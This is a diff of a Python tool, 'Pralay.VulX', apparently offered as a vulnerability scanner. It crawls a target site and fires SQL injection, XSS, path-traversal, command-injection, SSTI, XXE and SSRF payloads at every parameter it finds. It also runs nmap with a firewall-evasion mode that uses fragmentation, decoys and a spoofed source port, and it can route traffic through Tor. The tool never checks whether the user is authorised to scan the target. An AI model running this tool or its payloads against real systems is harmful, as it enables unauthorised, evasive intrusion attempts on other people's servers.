@@ -1,24 +1,19 @@
 #!/usr/bin/env python3
 """
-Pralay.VulX - Ultimate Vulnerability Scanner with Progress Indicator
+Pralay.VulX - Ultimate Vulnerability Scanner with Severity & Parameter Info
 Author: Vimal Bijalwan
-Version: 2.1 (Progress Bar + Real-time Output)
+Version: 3.0 (Real Vulns + Severity Levels)
 """
 
 import sys
-import json
 import subprocess
 import requests
 import argparse
 import time
-import threading
 from datetime import datetime
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urljoin
 from bs4 import BeautifulSoup
 
-# ------------------------
-# ASCII BANNER
-# ------------------------
 BANNER = r"""
 ╔══════════════════════════════════════════════════════════════════╗
 ║    ██████╗ ██████╗  █████╗ ██╗      █████╗ ██╗   ██╗             ║
@@ -28,13 +23,10 @@ BANNER = r"""
 ║    ██║     ██║  ██║██║  ██║███████╗██║  ██║   ██║                ║
 ║    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝                ║
 ║              PRALAY.VULX - Vimal Bijalwan Ed.                   ║
-║        "No Firewall Can Stop The Apocalypse"                     ║
+║        "Real Vulns with Severity - No Fake Alerts"               ║
 ╚══════════════════════════════════════════════════════════════════╝
 """
 
-# ------------------------
-# COMMON PARAMETER WORDLIST
-# ------------------------
 COMMON_PARAMS = [
     "id", "user", "username", "email", "pass", "password", "q", "search", "s", "page",
     "file", "doc", "folder", "path", "redirect", "url", "link", "goto", "return",
@@ -44,164 +36,162 @@ COMMON_PARAMS = [
     "wid", "xid", "yid", "zid", "data", "json", "xml", "callback", "callback_func"
 ]
 
-# ------------------------
-# PAYLOADS
-# ------------------------
-PAYLOADS = {
-    "SQLi": ["'", "\"", "1' OR '1'='1", "1 AND 1=1", "1 AND 1=2", "' OR '1'='1' --", "1' UNION SELECT NULL--"],
-    "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>", "javascript:alert(1)"],
-    "LFI": ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/etc/passwd", "../../../../../../etc/passwd"],
-    "RCE": ["; ls", "| ls", "`ls`", "$(ls)", "; cat /etc/passwd", "| cat /etc/passwd"],
-    "SSTI": ["{{7*7}}", "${7*7}", "{{7*'7'}}", "<% 7*7 %>", "${{7*7}}"],
-    "XXE": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'],
-    "SSRF": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080/admin", "http://localhost:22"]
+# Each vuln type: payloads, detection function, severity
+VULN_DEFS = {
+    "SQLi": {
+        "payloads": ["'", "\"", "1' OR '1'='1", "1 AND 1=1", "1 AND 1=2", "' OR '1'='1' --"],
+        "detect": lambda text: any(err in text.lower() for err in ["sql syntax", "mysql_fetch", "ora-", "postgresql error", "unclosed quotation mark"]),
+        "severity": "CRITICAL"
+    },
+    "XSS": {
+        "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"],
+        "detect": lambda text, payload: payload.lower() in text.lower(),
+        "severity": "HIGH"
+    },
+    "LFI": {
+        "payloads": ["../../../../etc/passwd", "/etc/passwd", "../../../../../../etc/passwd"],
+        "detect": lambda text: "root:x:" in text or "bin/bash" in text,
+        "severity": "HIGH"
+    },
+    "RCE": {
+        "payloads": ["; id", "| id", "`id`", "$(id)"],
+        "detect": lambda text: "uid=" in text and "gid=" in text,
+        "severity": "CRITICAL"
+    },
+    "SSTI": {
+        "payloads": ["{{7*7}}", "${7*7}", "{{7*'7'}}"],
+        "detect": lambda text: "49" in text and "7*7" not in text,
+        "severity": "HIGH"
+    },
+    "XXE": {
+        "payloads": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'],
+        "detect": lambda text: "root:x:" in text,
+        "severity": "CRITICAL"
+    },
+    "SSRF": {
+        "payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080/admin"],
+        "detect": lambda text: "ami-id" in text or "instance-id" in text,
+        "severity": "HIGH"
+    }
 }
 
-# ------------------------
-# NMAP WITH PROGRESS (REAL-TIME OUTPUT)
-# ------------------------
-def run_nmap_with_progress(target, ports, stealth=False, tor=False):
+def run_nmap_scan(target, ports, stealth=False, tor=False):
     cmd = ["nmap", "-sV", "--script", "vulners", "-v", "-p", ports, target]
     if stealth:
-        cmd += ["-T1", "-f", "--data-length", "200", "-D", "RND:10", "--source-port", "53", "--max-retries", "1", "--host-timeout", "30s"]
-        print("[*] Stealth mode active: scan may take several minutes")
+        cmd += ["-T1", "-f", "--data-length", "200", "-D", "RND:10", "--source-port", "53"]
     if tor:
         cmd = ["proxychains4", "-q"] + cmd
-        print("[*] Tor mode active")
-    
     print(f"[*] Running: {' '.join(cmd)}\n")
-    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
-    output_lines = []
-    for line in process.stdout:
-        print(line, end='')  # Show live output
-        output_lines.append(line)
-    process.wait()
-    return ''.join(output_lines)
+    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
+    out = []
+    for line in proc.stdout:
+        print(line, end='')
+        out.append(line)
+    proc.wait()
+    return ''.join(out)
 
-# ------------------------
-# CRAWLER WITH PROGRESS
-# ------------------------
-def crawl_parameters(start_url, depth=1):
-    print(f"[*] Crawling {start_url} (depth {depth})...")
+def crawl_params(start_url, depth=1):
+    print(f"[*] Crawling {start_url}...")
     visited = set()
     params = set()
-    to_visit = [(start_url, 0)]
-    total_links = 0
-    while to_visit:
-        url, d = to_visit.pop(0)
+    queue = [(start_url, 0)]
+    while queue:
+        url, d = queue.pop(0)
         if url in visited or d > depth:
             continue
         visited.add(url)
-        total_links += 1
-        print(f"[*] Crawling: {url} (depth {d}) - found {len(params)} parameters so far", end='\r')
+        print(f"[*] Found {len(params)} parameters so far", end='\r')
         try:
             resp = requests.get(url, timeout=5, verify=False)
             soup = BeautifulSoup(resp.text, 'html.parser')
             for link in soup.find_all('a', href=True):
                 full = urljoin(url, link['href'])
                 if full.startswith(start_url) and full not in visited:
-                    to_visit.append((full, d+1))
+                    queue.append((full, d+1))
             for form in soup.find_all('form'):
                 action = form.get('action')
                 form_url = urljoin(url, action) if action else url
                 method = form.get('method', 'get').lower()
-                for input_tag in form.find_all(['input', 'textarea', 'select']):
-                    name = input_tag.get('name')
+                for inp in form.find_all(['input', 'textarea', 'select']):
+                    name = inp.get('name')
                     if name:
                         params.add((form_url, method, name))
         except:
             continue
-    print(f"\n[*] Crawling complete. Found {len(params)} parameters.")
+    print(f"\n[*] Total parameters found: {len(params)}")
     return list(params)
 
-# ------------------------
-# FUZZING WITH PROGRESS PERCENTAGE
-# ------------------------
-def fuzz_parameters_with_progress(param_list, delay=0.1):
-    if not param_list:
-        return []
+def fuzz_params(params, delay=0.05):
     findings = []
-    total_tests = len(param_list) * sum(len(payloads) for payloads in PAYLOADS.values())
-    current_test = 0
-    print(f"\n[*] Starting fuzzing: {len(param_list)} parameters, {sum(len(p) for p in PAYLOADS.values())} payloads each = {total_tests} total requests")
-    for idx, (url, method, param) in enumerate(param_list, 1):
-        for vuln_type, payloads in PAYLOADS.items():
-            for payload in payloads:
-                current_test += 1
-                percent = (current_test / total_tests) * 100
-                sys.stdout.write(f"\r[*] Progress: {percent:.1f}% | Param {idx}/{len(param_list)}: {param} | Testing {vuln_type}...")
+    total = len(params) * sum(len(v["payloads"]) for v in VULN_DEFS.values())
+    curr = 0
+    print(f"\n[*] Starting fuzzing ({total} requests)...")
+    for idx, (url, method, param) in enumerate(params, 1):
+        for vuln_type, data in VULN_DEFS.items():
+            for payload in data["payloads"]:
+                curr += 1
+                pct = curr / total * 100
+                sys.stdout.write(f"\r[*] Progress: {pct:.1f}% | Param {idx}/{len(params)}: {param} | Testing {vuln_type}")
                 sys.stdout.flush()
-                full_url = f"{url}?{param}={payload}"
                 try:
-                    resp = requests.get(full_url, timeout=3, verify=False)
-                    if vuln_type == "SQLi" and ("mysql" in resp.text.lower() or "sql" in resp.text.lower() or "syntax" in resp.text.lower()):
-                        findings.append(f"[!] {vuln_type} at {url} with {param}={payload}")
-                    elif vuln_type == "XSS" and payload in resp.text:
-                        findings.append(f"[!] {vuln_type} (reflected) at {url} with {param}={payload}")
-                    elif vuln_type == "LFI" and ("root:" in resp.text or "[extensions]" in resp.text):
-                        findings.append(f"[!] {vuln_type} at {url} with {param}={payload}")
-                    elif vuln_type in ["RCE","SSTI","XXE","SSRF"] and ("uid=" in resp.text or "root" in resp.text):
-                        findings.append(f"[!] Possible {vuln_type} at {url} with {param}={payload}")
+                    full = f"{url}?{param}={payload}"
+                    resp = requests.get(full, timeout=3, verify=False)
+                    text = resp.text
+                    if vuln_type == "XSS":
+                        if data["detect"](text, payload):
+                            findings.append((vuln_type, url, param, payload, data["severity"]))
+                    else:
+                        if data["detect"](text):
+                            findings.append((vuln_type, url, param, payload, data["severity"]))
                 except:
                     pass
                 time.sleep(delay)
     print("\n[*] Fuzzing complete.")
     return findings
 
-# ------------------------
-# REPORT GENERATION
-# ------------------------
-def generate_report(target, vulnerabilities, fuzz_findings, stealth_used, tor_used):
+def generate_report(target, cves, web_findings, stealth, tor):
     report = f"""
 {BANNER}
 ╔══════════════════════════════════════════════════════════╗
-║                   SCAN REPORT (Vimal Bijalwan)           ║
-║ Target : {target}                                           
+║                     SCAN REPORT                          ║
+║ Target : {target}                                         
 ║ Time   : {datetime.now()}                                 
-║ Stealth: {stealth_used} | Tor: {tor_used}                       
+║ Stealth: {stealth} | Tor: {tor}                          
 ╚══════════════════════════════════════════════════════════╝
-
 """
-    if not vulnerabilities and not fuzz_findings:
-        report += "[✓] No vulnerabilities found.\n"
-    else:
-        if vulnerabilities:
-            report += "\n🔴 CVEs FOUND:\n" + "-"*50 + "\n"
-            for v in vulnerabilities:
-                report += f"""
-[+] {v.get('service','Unknown')}
-    CVE: {v.get('cve_id','N/A')} | CVSS: {v.get('cvss',0)} | Severity: {v.get('severity','N/A')}
-"""
-        if fuzz_findings:
-            report += "\n🌐 WEB PARAMETER VULNS:\n" + "-"*50 + "\n" + "\n".join(fuzz_findings) + "\n"
+    if not cves and not web_findings:
+        report += "\n[✓] No vulnerabilities detected.\n"
+    if cves:
+        report += "\n🔴 CVEs (Network Level):\n" + "-"*50 + "\n"
+        for c in cves:
+            report += f"[+] {c['service']} | {c['cve_id']} | CVSS: {c['cvss']} | Severity: {c['severity']}\n"
+    if web_findings:
+        report += "\n🌐 WEB VULNERABILITIES (Parameter Based):\n" + "-"*70 + "\n"
+        for vuln_type, url, param, payload, sev in web_findings:
+            report += f"[{sev}] {vuln_type} at {url}\n    Parameter: {param} = {payload}\n\n"
     print(report)
-    filename = f"PralayVulX_report_{target.replace('/', '_')}.txt"
-    with open(filename, "w") as f:
+    fname = f"PralayVulX_report_{target.replace('/', '_')}.txt"
+    with open(fname, "w") as f:
         f.write(report)
-    print(f"[*] Report saved as {filename}")
+    print(f"[*] Report saved: {fname}")
 
-# ------------------------
-# MAIN
-# ------------------------
 def main():
     print(BANNER)
-    parser = argparse.ArgumentParser(description="Pralay.VulX - Vimal Bijalwan Edition")
-    parser.add_argument("target", help="IP or hostname")
-    parser.add_argument("--ports", default="1-1000", help="Port range")
-    parser.add_argument("--crawl-url", help="Base URL for crawling + fuzzing")
-    parser.add_argument("--stealth", action="store_true", help="Firewall evasion mode")
-    parser.add_argument("--tor", action="store_true", help="Route scans through Tor")
-    parser.add_argument("--no-nmap", action="store_true", help="Skip nmap scan")
-    args = parser.parse_args()
+    p = argparse.ArgumentParser()
+    p.add_argument("target", help="IP or hostname")
+    p.add_argument("--ports", default="1-1000")
+    p.add_argument("--crawl-url", help="Base URL for crawling + fuzzing")
+    p.add_argument("--stealth", action="store_true")
+    p.add_argument("--tor", action="store_true")
+    p.add_argument("--no-nmap", action="store_true")
+    args = p.parse_args()
 
-    vulnerabilities = []
-    fuzz_findings = []
+    cves = []
+    web_findings = []
 
     if not args.no_nmap:
-        nmap_out = run_nmap_with_progress(args.target, args.ports, args.stealth, args.tor)
-        # Parse vulners output (simple extraction)
-        lines = nmap_out.splitlines()
-        for line in lines:
+        out = run_nmap_scan(args.target, args.ports, args.stealth, args.tor)
+        for line in out.splitlines():
             if "CVE-" in line and "vulners" in line:
                 parts = line.split()
                 if len(parts) >= 3:
@@ -211,16 +201,15 @@ def main():
                     except:
                         score = 0.0
                     sev = "CRITICAL" if score>=9 else "HIGH" if score>=7 else "MEDIUM" if score>=4 else "LOW"
-                    vulnerabilities.append({"cve_id": cve, "cvss": score, "severity": sev, "service": "detected"})
+                    cves.append({"cve_id": cve, "cvss": score, "severity": sev, "service": "detected"})
 
     if args.crawl_url:
-        params = crawl_parameters(args.crawl_url, depth=1)
+        params = crawl_params(args.crawl_url, depth=1)
         if not params:
-            print("[*] No parameters found via crawling. Using common wordlist...")
             params = [(args.crawl_url, "get", p) for p in COMMON_PARAMS]
-        fuzz_findings = fuzz_parameters_with_progress(params, delay=0.1)
+        web_findings = fuzz_params(params, delay=0.05)
 
-    generate_report(args.target, vulnerabilities, fuzz_findings, args.stealth, args.tor)
+    generate_report(args.target, cves, web_findings, args.stealth, args.tor)
 
 if __name__ == "__main__":
     main()
